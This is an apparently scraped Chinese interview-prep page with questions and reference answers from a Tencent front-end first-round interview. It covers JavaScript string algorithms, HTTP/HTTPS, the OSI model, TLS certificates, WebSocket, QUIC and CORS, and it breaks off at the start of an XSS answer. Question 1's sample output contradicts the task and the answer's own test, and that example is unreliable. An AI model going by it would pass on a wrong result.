+++
title = "腾讯-视频-校招 · 第 1 轮 · 一面"
draft = false
weight = 1
tags = ["面试", "前端", "大厂面经", "腾讯", "一面", "ecool"]
categories = ["前端开发", "面试", "大厂面经"]
source = "https://fe.ecool.fun/experience/44"
experienceId = 44
roundId = 58
roundOrder = 1
company = "腾讯"
date = "2025-07-17T14:02:21.000Z"
+++

> ← 已是第一轮 · [返回本次面经]({{< relref "/posts/frontend/interview-experiences/experience-44/_index.md" >}}) · 已是最后一轮 →

**本轮要点：** - 考点覆盖：网络协议（HTTP/HTTPS、OSI、WebSocket、QUIC、CORS）、安全（XSS、缓存投毒）、性能优化（缓存、懒加载/预加载）、工程化（版本更新、路由）、Vue框架细节。
- 难易度：中等偏上。前6题基础网络必会，7-10题需理解协议差异与实战场景，11-16题偏重安全与缓存的落地策略，17-20题考察框架原理与工程思维，梯度合理但深度要求高。

本轮共 21 道题。答案默认折叠，便于先自行作答。

## 1. 统计出现次数最多的字符以及出现的次数 {#question-subjective-78e6f23a2378}

题目描述：

- 编写一个函数，接收一个字符串作为输入，统计并返回出现次数最多的字符及其出现的次数。如果有多个字符出现次数相同且最多，则返回所有这些字符及其出现次数。

- 输入输出要求：
1. 输入：一个字符串（只包含字母和数字）。
2. 输出：一个对象，包含出现次数最多的字符及其出现次数。
示例：
```js
const input = "aabbccddde";
const result = mostFrequentChar(input);
console.log(result); // 输出：{ a: 2, b: 2, c: 2, d: 3, e: 1 }
```

### 题目要点

- 时间复杂度：O(n)，需要遍历字符串两次
- 空间复杂度：O(k)，k为不同字符的数量
- 关键点：正确理解题意，返回所有出现次数最多的字符
- 优化：可以在统计过程中同时记录最大值，减少遍历次数

<details>
<summary>参考答案</summary>

这道题需要统计字符串中每个字符的出现次数，然后找出出现次数最多的字符。需要注意的是，题目要求如果有多个字符出现次数相同且最多，要返回所有这些字符。

**解题思路：**

1. 遍历字符串，使用Map或对象统计每个字符的出现次数
2. 找出最大出现次数
3. 筛选出所有达到最大出现次数的字符
4. 返回结果对象

**代码实现：**

```js
function mostFrequentChar(str) {
    // 边界情况处理
    if (!str || str.length === 0) {
        return {};
    }

    // 统计每个字符的出现次数
    const charCount = {};
    for (let char of str) {
        charCount[char] = (charCount[char] || 0) + 1;
    }

    // 找出最大出现次数
    const maxCount = Math.max(...Object.values(charCount));

    // 筛选出所有达到最大出现次数的字符
    const result = {};
    for (let [char, count] of Object.entries(charCount)) {
        if (count === maxCount) {
            result[char] = count;
        }
    }

    return result;
}

// 优化版本：使用Map，一次遍历完成
function mostFrequentCharOptimized(str) {
    if (!str || str.length === 0) {
        return {};
    }

    const charCount = new Map();
    let maxCount = 0;

    // 统计字符出现次数，同时记录最大值
    for (let char of str) {
        const count = (charCount.get(char) || 0) + 1;
        charCount.set(char, count);
        maxCount = Math.max(maxCount, count);
    }

    // 构建结果对象
    const result = {};
    for (let [char, count] of charCount) {
        if (count === maxCount) {
            result[char] = count;
        }
    }

    return result;
}
```
测试用例：

```js
// 测试示例
console.log(mostFrequentChar("aabbccddde"));
// 输出：{ d: 3 }

console.log(mostFrequentChar("aabbcc"));
// 输出：{ a: 2, b: 2, c: 2 }

console.log(mostFrequentChar("abcdef"));
// 输出：{ a: 1, b: 1, c: 1, d: 1, e: 1, f: 1 }

console.log(mostFrequentChar(""));
// 输出：{}
```

</details>

## 2. 【算法题】大数相加 {#question-subjective-32d412cc7cc7}

- 题目描述：

编写一个函数，接收两个字符串形式的大整数作为输入，返回它们的和。由于数字可能非常大，超出 JavaScript 原生数字类型的范围，因此需要手动实现加法逻辑。

- 输入输出要求：

1. 输入：两个字符串形式的非负整数。
2. 输出：一个字符串，表示两个输入数字的和。

示例：

```js
const num1 = "12345678901234567890";
const num2 = "98765432109876543210";
const result = addBigNumbers(num1, num2);
console.log(result); // 输出：111111111011111111100
```

### 题目要点

- 时间复杂度：O(max(m, n))，m和n分别是两个数字的长度
- 空间复杂度：O(max(m, n))，用于存储结果
- 关键点：正确处理进位、不同长度数字、边界情况
- 优化：使用数组而非字符串拼接提升性能，处理前导零

**面试中的扩展讨论：**

1. **错误处理**：如何处理非法输入（负数、非数字字符）
2. **性能优化**：大数运算的性能瓶颈和优化策略
3. **扩展功能**：如何实现大数减法、乘法、除法
4. **实际应用**：在什么场景下需要大数运算（金融计算、密码学等）

<details>
<summary>参考答案</summary>

大数相加是经典的字符串处理算法题，需要模拟手工加法的过程，从低位到高位逐位相加，处理进位。

**解题思路：**

1. 从两个字符串的末尾开始，逐位相加
2. 处理进位情况
3. 考虑两个数字长度不同的情况
4. 最后处理可能剩余的进位

**代码实现：**

```js
function addBigNumbers(num1, num2) {
    // 边界情况处理
    if (!num1 || num1 === "0") return num2 || "0";
    if (!num2 || num2 === "0") return num1 || "0";

    let result = "";
    let carry = 0;
    let i = num1.length - 1;
    let j = num2.length - 1;

    // 从低位到高位逐位相加
    while (i >= 0 || j >= 0 || carry > 0) {
        const digit1 = i >= 0 ? parseInt(num1[i]) : 0;
        const digit2 = j >= 0 ? parseInt(num2[j]) : 0;

        const sum = digit1 + digit2 + carry;
        result = (sum % 10) + result;
        carry = Math.floor(sum / 10);

        i--;
        j--;
    }

    return result;
}

// 更清晰的实现版本
function addBigNumbersV2(num1, num2) {
    // 输入验证
    if (!isValidNumber(num1) || !isValidNumber(num2)) {
        throw new Error("Invalid input: numbers must be non-negative integers");
    }

    // 边界情况
    if (num1 === "0") return num2;
    if (num2 === "0") return num1;

    const result = [];
    let carry = 0;
    let i = num1.length - 1;
    let j = num2.length - 1;

    while (i >= 0 || j >= 0 || carry) {
        let sum = carry;

        if (i >= 0) {
            sum += Number(num1[i]);
            i--;
        }

        if (j >= 0) {
            sum += Number(num2[j]);
            j--;
        }

        result.unshift(sum % 10);
        carry = Math.floor(sum / 10);
    }

    return result.join('');
}

// 输入验证辅助函数
function isValidNumber(str) {
    return /^\d+$/.test(str);
}
```

优化版本（处理前导零）：

```js
function addBigNumbersAdvanced(num1, num2) {
    // 移除前导零
    num1 = removeLeadingZeros(num1);
    num2 = removeLeadingZeros(num2);

    if (num1 === "0") return num2;
    if (num2 === "0") return num1;

    let result = "";
    let carry = 0;
    let i = num1.length - 1;
    let j = num2.length - 1;

    while (i >= 0 || j >= 0 || carry) {
        const a = i >= 0 ? +num1[i--] : 0;
        const b = j >= 0 ? +num2[j--] : 0;
        const sum = a + b + carry;

        result = (sum % 10) + result;
        carry = Math.floor(sum / 10);
    }

    return result;
}

function removeLeadingZeros(str) {
    let i = 0;
    while (i < str.length - 1 && str[i] === '0') {
        i++;
    }
    return str.substring(i);
}
```

**测试用例：**

```js
// 基本测试
console.log(addBigNumbers("123", "456"));
// 输出：579

console.log(addBigNumbers("12345678901234567890", "98765432109876543210"));
// 输出：111111111011111111100

// 边界情况测试
console.log(addBigNumbers("0", "123"));
// 输出：123

console.log(addBigNumbers("999", "1"));
// 输出：1000

console.log(addBigNumbers("1", "999"));
// 输出：1000

// 长度不同的数字
console.log(addBigNumbers("123456789", "987"));
// 输出：123457776
```

**性能分析和优化：**
```js
// 性能优化版本：减少字符串拼接
function addBigNumbersOptimized(num1, num2) {
    const result = [];
    let carry = 0;
    let i = num1.length - 1;
    let j = num2.length - 1;

    while (i >= 0 || j >= 0 || carry) {
        let sum = carry;
        if (i >= 0) sum += +num1[i--];
        if (j >= 0) sum += +num2[j--];

        result.push(sum % 10);
        carry = Math.floor(sum / 10);
    }

    return result.reverse().join('');
}
```

</details>

## 3. HTTP 和 HTTPS 的区别是什么？ {#question-subjective-6e663d6cf206}

### 题目要点

- 核心差异：加密传输vs明文传输
- 安全保障：身份验证、数据完整性、传输加密
- 技术实现：TLS/SSL协议、数字证书、密钥交换
- 实际影响：性能开销、SEO优势、用户信任

<details>
<summary>参考答案</summary>

HTTP和HTTPS的核心区别在于安全性，HTTPS是HTTP的安全版本，通过TLS/SSL协议提供加密传输。

**主要区别：**

**安全性方面**：HTTP是明文传输，数据在网络中可以被轻易截获和篡改。HTTPS通过TLS/SSL加密，确保数据在传输过程中的机密性和完整性。即使被截获，攻击者也无法解读加密后的内容。

**端口差异**：HTTP默认使用80端口，HTTPS默认使用443端口。这是两个协议在网络层面的基本区分。

**证书验证**：HTTPS需要SSL证书来验证服务器身份，证书由权威的证书颁发机构（CA）签发。客户端会验证证书的有效性，确保连接到正确的服务器，防止中间人攻击。

**性能影响**：HTTPS由于需要进行加密解密操作和TLS握手，会有一定的性能开销。但现代硬件和优化算法已经将这种影响降到最低，通常用户感知不到明显差异。

**SEO影响**：搜索引擎（如Google）将HTTPS作为排名因素之一，HTTPS网站在搜索结果中会有更好的排名。浏览器也会对HTTP网站显示"不安全"警告。

**连接建立过程**：HTTP直接建立TCP连接后就可以发送请求。HTTPS需要在TCP连接基础上进行TLS握手，包括证书验证、密钥交换等步骤，连接建立过程更复杂但更安全。

</details>

## 4. HTTP协议位于OSI七层模型中的哪一层？ {#question-subjective-ae23e89bd7dd}

### 题目要点

- 位置：应用层（第7层）
- 职责：定义应用程序间的通信规则
- 依赖：基于传输层TCP协议
- 特点：面向应用、无状态、请求-响应模式

<details>
<summary>参考答案</summary>

HTTP协议位于OSI七层模型的**应用层（第7层）**。

HTTP作为应用层协议，直接为用户应用程序提供服务。它定义了客户端和服务器之间交换数据的格式和规则，包括请求方法、状态码、头部字段等。

**在协议栈中的位置：**

- 应用层：HTTP、HTTPS、FTP、SMTP等
- 表示层：数据加密、压缩、格式转换
- 会话层：会话管理、连接控制
- 传输层：TCP、UDP
- 网络层：IP协议
- 数据链路层：以太网、WiFi
- 物理层：电缆、光纤、无线信号

HTTP依赖于传输层的TCP协议来保证数据的可靠传输，TCP负责建立连接、数据分段、错误检测和重传等功能。HTTP本身不关心底层的网络实现细节，只专注于应用层的数据交换格式。

</details>

## 5. 讲一下OSI七层模型的每一层及其主要功能 {#question-subjective-739b3d06e470}

### 题目要点

- 分层思想：每层专注特定功能，层间接口标准化
- 数据封装：每层添加自己的头部信息
- 协议对应：不同层次对应不同的网络协议
- 实际意义：理论模型，实际网络多采用TCP/IP四层模型

<details>
<summary>参考答案</summary>

OSI（开放系统互联）七层模型是网络通信的理论框架，将网络通信过程分解为七个层次，每层都有特定的功能和职责。

**第7层 - 应用层（Application Layer）**：
直接为用户应用程序提供网络服务。定义应用程序之间的通信协议和数据格式。

- 主要协议：HTTP/HTTPS、FTP、SMTP、DNS、SSH
- 功能：文件传输、电子邮件、网页浏览、远程登录

**第6层 - 表示层（Presentation Layer）**：
负责数据的格式化、加密解密、压缩解压缩等数据转换工作。

- 主要功能：数据加密（SSL/TLS）、数据压缩（GZIP）、字符编码转换
- 确保不同系统间数据格式的兼容性

**第5层 - 会话层（Session Layer）**：
管理应用程序之间的会话连接，包括建立、管理和终止会话。

- 主要功能：会话建立、会话管理、同步控制、检查点设置
- 协议示例：NetBIOS、RPC、SQL会话

**第4层 - 传输层（Transport Layer）**：
提供端到端的可靠数据传输服务，处理数据分段、流量控制、错误检测。

- 主要协议：TCP（可靠传输）、UDP（快速传输）
- 功能：端口寻址、数据分段重组、流量控制、错误恢复

**第3层 - 网络层（Network Layer）**：
负责数据包的路由选择和转发，实现不同网络间的互联。

- 主要协议：IP、ICMP、OSPF、BGP
- 功能：逻辑地址分配、路径选择、数据包转发

**第2层 - 数据链路层（Data Link Layer）**：
在物理连接上提供可靠的数据传输，处理帧的组装和错误检测。

- 主要协议：以太网、WiFi、PPP
- 功能：帧同步、错误检测、流量控制、MAC地址寻址

**第1层 - 物理层（Physical Layer）**：
定义网络设备间的物理连接特性，传输原始比特流。

- 涉及：电缆、光纤、无线信号、网卡、集线器
- 功能：电气特性、机械特性、信号传输

**实际应用中的数据流向：**
发送时：应用层 → 物理层（数据封装）
接收时：物理层 → 应用层（数据解封装）

</details>

## 6. 在服务端非对称加密中，公钥是如何发送到客户端的？ {#question-subjective-78e895c53e60}

### 题目要点

传输方式：通过数字证书在TLS握手阶段传输
安全保障：CA签名验证、证书链信任机制
包含信息：公钥、身份信息、有效期、签名
验证过程：客户端验证证书有效性后提取公钥

<details>
<summary>参考答案</summary>

在HTTPS连接建立过程中，服务端公钥通过数字证书的形式发送给客户端，这个过程发生在TLS握手阶段。

**TLS握手过程中的公钥传输：**

**1. 客户端发起连接**：客户端发送Client Hello消息，包含支持的TLS版本、加密套件列表、随机数等信息。

**2. 服务端响应**：服务端发送Server Hello消息，选择加密套件，然后发送Certificate消息，其中包含服务端的数字证书。

**3. 证书内容**：数字证书包含以下关键信息：

- 服务端的公钥
- 证书持有者信息（域名、组织等）
- 证书颁发机构（CA）信息
- 证书有效期
- CA的数字签名

```javascript
// 证书结构示例
{
    version: "3",
    serialNumber: "12345678",
    issuer: "CN=DigiCert SHA2 Secure Server CA",
    subject: "CN=example.com",
    validity: {
        notBefore: "2023-01-01",
        notAfter: "2024-01-01"
    },
    publicKey: {
        algorithm: "RSA",
        keySize: 2048,
        key: "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMI..."
    },
    signature: "CA的数字签名"
}
```

**4. 证书链传输**：通常服务端会发送完整的证书链，包括服务端证书、中间CA证书，直到根CA证书。这样客户端可以验证整个信任链。

**5. 公钥提取**：客户端从证书中提取服务端的公钥，用于后续的密钥交换过程。

**安全保障机制：**

- 证书由权威CA签名，防止伪造
- 证书包含域名信息，防止中间人攻击
- 证书有有效期限制，定期更新
- 客户端维护受信任的根CA列表

</details>

## 7. 客户端如何校验服务端公钥的真实性？ {#question-subjective-95cc516c3a51}

### 题目要点

- 核心机制：数字签名验证和证书链信任
- 验证内容：签名、有效期、域名、撤销状态
- 信任基础：预装的根CA证书列表
- 安全保障：多层验证确保公钥真实性

<details>
<summary>参考答案</summary>

客户端通过数字证书验证机制来校验服务端公钥的真实性，这是一个多层次的验证过程。

**证书验证的完整流程：**

**1. 证书链验证**：
客户端从服务端证书开始，沿着证书链向上验证，直到找到受信任的根CA证书。每一级证书都用上级CA的公钥验证其数字签名。

```javascript
// 证书链验证示例
验证链：服务端证书 → 中间CA证书 → 根CA证书
验证过程：
1. 用中间CA公钥验证服务端证书签名
2. 用根CA公钥验证中间CA证书签名
3. 根CA证书在客户端受信任列表中
```

**2. 数字签名验证**：
使用CA的公钥验证证书上的数字签名，确保证书内容未被篡改。签名验证过程包括：

- 使用相同的哈希算法计算证书内容的哈希值
- 用CA公钥解密证书上的签名
- 比较两个哈希值是否一致

**3. 证书有效期检查**：
验证证书的有效期，确保证书在当前时间内有效。包括检查notBefore和notAfter字段。

**4. 域名匹配验证**：
检查证书中的域名信息是否与当前访问的域名匹配。支持通配符证书和多域名证书。

```javascript
// 域名匹配示例
证书域名: *.example.com
访问域名: www.example.com  ✓ 匹配
访问域名: api.example.com  ✓ 匹配
访问域名: sub.api.example.com  ✗ 不匹配
```

**5. 证书撤销检查**：
通过CRL（证书撤销列表）或OCSP（在线证书状态协议）检查证书是否已被撤销。

**6. 证书用途验证**：
检查证书的扩展字段，确保证书被授权用于服务器身份验证。

**客户端信任机制：**

- **根证书存储**：操作系统和浏览器维护受信任的根CA证书列表
- **证书固定**：应用可以预先固定特定的证书或CA，提高安全性
- **透明度日志**：Certificate Transparency机制记录所有证书，防止恶意证书

**验证失败的处理：**
当证书验证失败时，客户端会：

- 显示安全警告
- 阻止连接建立
- 记录安全事件
- 提供用户选择（在某些情况下）

</details>

## 8. 在面试中使用的腾讯会议中，可能用到了哪些网络协议？ {#question-subjective-012fd2a07eb0}

### 题目要点

- 多协议协作：不同功能使用最适合的协议
- 实时性优先：音视频传输使用UDP保证低延迟
- 安全保障：多层加密保护用户隐私
- 网络适应：智能选择传输路径和质量参数

<details>
<summary>参考答案</summary>

腾讯会议作为一个复杂的实时音视频通信应用，涉及多种网络协议来保证不同功能的实现。

**应用层协议：**

**HTTP/HTTPS**：用于用户认证、会议管理、配置下发等基础服务。包括登录验证、会议创建、参会者管理、设置同步等功能。

**WebSocket**：实现实时消息推送，如会议通知、聊天消息、会议状态变更等。提供全双工通信能力，确保消息的实时性。

**WebRTC相关协议**：

- **STUN/TURN**：用于NAT穿透和中继服务，解决不同网络环境下的连接问题
- **ICE**：交互式连接建立，自动选择最优的连接路径
- **DTLS**：数据传输层安全协议，为媒体流提供加密

**实时传输协议：**

**RTP/RTCP**：

- RTP负责音视频数据的实时传输
- RTCP提供传输质量反馈和控制信息
- 支持时间戳同步、丢包检测、带宽适配

**SIP（可能使用）**：会话初始协议，用于建立、修改和终止多媒体会话。

**传输层协议：**

**TCP**：用于可靠数据传输，如文件共享、聊天消息、控制信令等需要保证数据完整性的场景。

**UDP**：用于音视频流传输，优先考虑实时性而非可靠性。丢包时不重传，避免延迟累积。

**网络层和其他：**

**IP协议**：基础的网络层协议，负责数据包路由。

**DNS**：域名解析，将服务器域名解析为IP地址。

**QUIC（可能使用）**：基于UDP的新一代传输协议，结合了TCP的可靠性和UDP的速度。

**具体应用场景：**

```javascript
// 协议使用场景示例
会议加入: HTTPS + WebSocket
音视频传输: RTP/UDP + DTLS
屏幕共享: RTP/UDP (视频) + TCP (控制)
文字聊天: WebSocket/TCP
文件传输: HTTP/HTTPS + TCP
网络检测: STUN/TURN + UDP
```

**QoS和网络优化：**

- **带宽自适应**：根据网络状况动态调整音视频质量
- **丢包恢复**：使用FEC（前向纠错）和重传机制
- **延迟优化**：优先使用UDP，减少缓冲延迟
- **多路径传输**：同时使用多个网络路径提高稳定性

**安全协议：**

- **TLS/SSL**：保护控制信令和用户数据
- **SRTP**：安全实时传输协议，加密音视频流
- **DTLS**：为UDP传输提供加密保护

</details>

## 9. WebSocket协议位于OSI七层模型中的哪一层？ {#question-subjective-d2b6a24519a3}

### 题目要点

- 位置：应用层（第7层）
- 特点：基于TCP的全双工通信协议
- 建立：通过HTTP协议升级机制
- 独立性：连接后成为独立的应用层协议

<details>
<summary>参考答案</summary>

WebSocket协议位于OSI七层模型的**应用层（第7层）**。

WebSocket是一个应用层协议，它为Web应用提供全双工通信能力。虽然WebSocket在建立连接时需要通过HTTP握手，但一旦连接建立，它就成为一个独立的应用层协议。

**WebSocket的协议栈位置：**

```plaintext
应用层 (Layer 7): WebSocket协议
表示层 (Layer 6): 数据加密/压缩 (WSS使用TLS)
会话层 (Layer 5): 会话管理
传输层 (Layer 4): TCP协议
网络层 (Layer 3): IP协议
数据链路层 (Layer 2): 以太网等
物理层 (Layer 1): 物理传输介质
```

**WebSocket的特殊性：**

**协议升级机制**：WebSocket通过HTTP的协议升级机制建立连接。客户端发送带有特殊头部的HTTP请求，服务器响应101状态码完成协议切换。

```plaintext
// 客户端请求
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

// 服务器响应
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**独立的帧格式**：连接建立后，WebSocket使用自己的帧格式进行数据传输，不再依赖HTTP格式。

**与HTTP的关系**：

- 建立阶段：依赖HTTP进行握手
- 传输阶段：独立的应用层协议
- 端口共享：可以与HTTP服务共享80/443端口

**应用层特征**：

- 直接为应用程序提供服务
- 定义了特定的数据格式和通信规则
- 支持文本和二进制数据传输
- 提供心跳检测和连接管理机制

</details>

## 10. WebSocket协议与HTTP长连接有什么不同？ {#question-subjective-7d65508709f1}

### 题目要点

- 通信模式：请求-响应 vs 全双工通信
- 协议特性：HTTP复用 vs 独立协议
- 性能开销：头部开销 vs 帧开销
- 应用场景：API优化 vs 实时通信

<details>
<summary>参考答案</summary>

WebSocket和HTTP长连接虽然都能保持连接状态，但在通信模式、协议特性、应用场景等方面有本质区别。

**通信模式差异：**

**HTTP长连接（Keep-Alive）**：

- 仍然是请求-响应模式，客户端必须先发起请求
- 服务器不能主动向客户端推送数据
- 每次通信都需要完整的HTTP头部信息
- 连接复用主要是为了减少TCP连接建立的开销

**WebSocket**：

- 全双工通信，客户端和服务器都可以主动发送数据
- 真正的实时双向通信
- 数据帧格式简洁，开销小
- 支持文本和二进制数据传输

```javascript
// HTTP长连接示例
// 客户端必须发起请求
fetch('/api/data', { keepalive: true })
  .then(response => response.json())
  .then(data => console.log(data));

// WebSocket示例
const ws = new WebSocket('ws://example.com');
ws.onmessage = (event) => {
  console.log('收到消息:', event.data);
};
// 服务器可以主动发送消息
ws.send('Hello Server');
```

**协议层面差异：**

**HTTP长连接**：

- 基于HTTP/1.1的Connection: keep-alive机制
- 每个请求都有完整的HTTP头部（通常几百字节到几KB）
- 需要遵循HTTP协议的所有规范和限制
- 超时机制由服务器配置决定

**WebSocket**：

- 独立的应用层协议（RFC 6455）
- 帧头部只有2-14字节，开销极小
- 协议简洁，专为实时通信设计
- 支持扩展和子协议

**连接建立和维护：**

```javascript
// HTTP长连接的连接复用
const agent = new http.Agent({ keepAlive: true });
// 多个请求复用同一个TCP连接

// WebSocket的连接建立
const ws = new WebSocket('ws://example.com');
ws.onopen = () => {
  console.log('连接建立');
  // 连接建立后可以随时双向通信
};
```

**性能和开销对比：**

**HTTP长连接**：

- 每次请求都有HTTP头部开销
- 适合偶发的请求-响应场景
- 服务器资源占用相对较少
- 缓存机制完善

**WebSocket**：

- 数据传输开销极小
- 适合频繁的双向通信
- 需要维护连接状态，服务器资源占用较多
- 无HTTP缓存机制

**应用场景差异：**

**HTTP长连接适用于**：

- API调用优化
- 文件下载/上传
- 传统的Web应用
- 需要利用HTTP缓存的场景

**WebSocket适用于**：

- 实时聊天应用
- 在线游戏
- 实时数据推送
- 协作编辑工具
- 实时监控系统

**代码实现对比：**

```javascript
// HTTP长连接实现实时效果（轮询）
setInterval(() => {
  fetch('/api/messages')
    .then(response => response.json())
    .then(messages => updateUI(messages));
}, 1000); // 每秒轮询一次

// WebSocket实现实时效果
const ws = new WebSocket('ws://example.com/messages');
ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  updateUI(message); // 立即更新UI
};
```

</details>

## 11. 简述QUIC协议的特点及其优势 {#question-subjective-ea10b5b9aa56}

### 题目要点

- 核心特点：基于UDP、内置加密、多路复用、连接迁移
- 主要优势：减少延迟、抗干扰、更好的拥塞控制
- 应用价值：Web性能提升、移动网络优化
- 发展趋势：HTTP/3标准化、广泛部署

<details>
<summary>参考答案</summary>

QUIC（Quick UDP Internet Connections）是Google开发的新一代传输协议，现已成为HTTP/3的基础传输协议，旨在解决TCP的性能瓶颈。

**QUIC的核心特点：**

**基于UDP构建**：
QUIC在UDP之上实现了可靠传输机制，避免了TCP的一些固有限制。UDP本身是无连接、不可靠的，但QUIC在应用层实现了连接管理、拥塞控制、流量控制等功能。

**内置加密**：
QUIC将TLS 1.3加密集成到协议核心，所有数据包都是加密的。这不仅提供了安全保障，还防止了中间设备对协议的干扰。

```javascript
// QUIC连接建立过程
客户端 -> 服务器: Initial包（包含TLS握手信息）
服务器 -> 客户端: Initial包 + Handshake包
客户端 -> 服务器: Handshake包
// 连接建立完成，可以开始发送应用数据
```

**多路复用无阻塞**：
QUIC在连接层面实现多路复用，不同流之间完全独立。一个流的丢包不会影响其他流的传输，解决了HTTP/2的队头阻塞问题。

**连接迁移**：
QUIC使用连接ID而不是四元组（源IP、源端口、目标IP、目标端口）来标识连接。当客户端网络发生变化（如从WiFi切换到移动网络）时，连接可以无缝迁移。

**QUIC的主要优势：**

**减少握手延迟**：

- **0-RTT连接建立**：对于之前连接过的服务器，可以在第一个数据包中就发送应用数据
- **1-RTT新连接**：新连接只需要一个往返时间就能建立，而TCP+TLS需要2-3个RTT

```plaintext
传统TCP+TLS:
TCP握手: 1 RTT
TLS握手: 1-2 RTT
总计: 2-3 RTT

QUIC:
新连接: 1 RTT
重连: 0 RTT
```

**更好的拥塞控制**：
QUIC实现了更先进的拥塞控制算法，能够更快地适应网络状况变化，提供更好的带宽利用率。

**抗网络干扰**：
由于QUIC完全加密，中间设备无法解析和修改协议内容，避免了各种网络中间件的干扰。

**灵活的流控制**：
QUIC提供了连接级和流级的流量控制，可以更精细地管理数据传输。

**实际应用优势：**

**Web性能提升**：

- 页面加载速度提升15-20%
- 特别是在高延迟、高丢包率的网络环境下效果显著
- 移动网络环境下的用户体验大幅改善

**视频流媒体优化**：

- 减少缓冲时间
- 更快的码率自适应
- 网络切换时的无缝体验

**API调用优化**：

- 减少API响应时间
- 更好的并发处理能力
- 移动应用的网络效率提升

**部署和兼容性：**

```javascript
// 检测QUIC支持
if ('serviceWorker' in navigator) {
  // 现代浏览器通常支持HTTP/3
  fetch('/api/data', {
    // 浏览器会自动协商使用HTTP/3 over QUIC
  });
}
```

**当前状态和未来**：

- HTTP/3已经标准化，基于QUIC协议
- 主要浏览器和CDN提供商已经支持
- 预计将成为下一代互联网的标准传输协议

**技术挑战**：

- UDP在某些网络环境下可能被限制
- 需要应用层实现复杂的可靠性机制
- 服务器端需要更多的CPU资源处理加密

</details>

## 12. 浏览器是如何发起跨域请求的？请解释CORS的工作原理 {#question-subjective-3ec6cde239dd}

### 题目要点

- 基础机制：同源策略限制和CORS协议解决
- 请求分类：简单请求直接发送，复杂请求需要预检
- 关键头部：Origin、Access-Control-*系列响应头
- 安全考虑：服务器端验证、凭据处理、Origin白名单

<details>
<summary>参考答案</summary>

浏览器的跨域请求机制基于同源策略的安全限制，通过CORS（跨源资源共享）协议来安全地实现跨域访问。

**同源策略基础：**
同源策略要求协议、域名、端口完全相同才能正常访问资源。这是浏览器的核心安全机制，防止恶意网站窃取其他网站的数据。

```javascript
// 同源判断示例
https://example.com:443/page1  // 源站
https://example.com:443/page2  // 同源 ✓
http://example.com:443/page1   // 不同协议 ✗
https://api.example.com:443/   // 不同域名 ✗
https://example.com:8080/      // 不同端口 ✗
```

**CORS的工作原理：**

**简单请求的处理：**
对于简单请求（GET、POST、HEAD，且头部字段在允许范围内），浏览器直接发送请求，并检查响应头中的CORS字段。

```javascript
// 简单请求示例
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
});

// 服务器响应头
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Credentials: true
Content-Type: application/json
```

**预检请求机制：**
对于复杂请求（非简单请求），浏览器会先发送OPTIONS预检请求，确认服务器是否允许实际请求。

```javascript
// 复杂请求示例
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({data: 'test'})
});

// 浏览器自动发送的预检请求
OPTIONS /data HTTP/1.1
Host: api.example.com
Origin: https://mysite.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, X-Custom-Header

// 服务器预检响应
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, X-Custom-Header
Access-Control-Max-Age: 86400
```

**CORS响应头详解：**

**Access-Control-Allow-Origin**：指定允许访问的源，可以是具体域名或通配符*。

```javascript
// 允许特定域名
Access-Control-Allow-Origin: https://mysite.com

// 允许所有域名（不安全，不推荐）
Access-Control-Allow-Origin: *

// 动态设置（服务器端逻辑）
const allowedOrigins = ['https://mysite.com', 'https://app.mysite.com'];
const origin = req.headers.origin;
if (allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
}
```

**Access-Control-Allow-Methods**：指定允许的HTTP方法。

**Access-Control-Allow-Headers**：指定允许的请求头字段。

**Access-Control-Allow-Credentials**：是否允许发送Cookie和认证信息。

**Access-Control-Max-Age**：预检请求的缓存时间。

**带凭据的跨域请求：**

```javascript
// 客户端发送凭据
fetch('https://api.example.com/data', {
  method: 'GET',
  credentials: 'include'  // 发送Cookie
});

// 服务器必须明确允许
Access-Control-Allow-Origin: https://mysite.com  // 不能使用*
Access-Control-Allow-Credentials: true
```

**CORS的安全考虑：**

**服务器端验证**：

```javascript
// Express.js示例
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});
```

**常见的CORS错误和解决方案：**

```javascript
// 错误1: Access-Control-Allow-Origin不匹配
// 解决: 服务器设置正确的Origin

// 错误2: 预检请求失败
// 解决: 服务器正确处理OPTIONS请求

// 错误3: 凭据请求被拒绝
// 解决: 设置Access-Control-Allow-Credentials: true
```

**其他跨域解决方案对比：**

**JSONP**：利用script标签不受同源策略限制，但只支持GET请求。

**代理服务器**：在同源服务器上设置代理，转发跨域请求。

**PostMessage**：用于不同窗口间的跨域通信。

</details>

## 13. 什么是XSS攻击？它有哪些常见的类型？ {#question-subjective-09a60060cb53}

### 题目要点

- 攻击原理：利用输入过滤不足注入恶意脚本
- 三种类型：反射型、存储型、DOM型XSS
- 主要危害：信息窃取、会话劫持、钓鱼攻击
- 攻击载体：URL参数、表单输入、DOM操作

<details>
<summary>参考答案</summary>

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者通过在网页中注入恶意脚本，当其他用户浏览该网页时，恶意脚本会在用户浏览器中执行，从而窃取用户信息或执行恶意操作。

**XSS攻击的基本原理：**
攻击者利用网站对用户输入过滤不足的漏洞，向网页注入恶意的HTML代码或JavaScript脚本。当受害者访问包含恶意代码的页面时，脚本会在受害者的浏览器中执行，获取敏感信息或执行恶意操作。

**XSS攻击的三种主要类型：**

